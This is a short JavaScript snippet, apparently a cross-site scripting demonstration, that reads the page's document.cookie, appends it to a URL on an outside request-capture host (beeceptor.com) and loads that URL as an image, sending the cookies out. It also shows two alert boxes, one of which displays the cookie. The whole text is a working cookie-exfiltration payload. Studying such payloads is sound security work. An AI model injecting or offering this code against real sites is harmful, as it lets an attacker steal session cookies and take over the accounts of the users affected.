var url = "https://llorave.free.beeceptor.com/my/api/path?cookie=";

url = url + document.cookie;

alert("magic! your cookie is " + document.cookie);

var my_image = new Image();
my_image.src = url;

alert("loaded the image!");
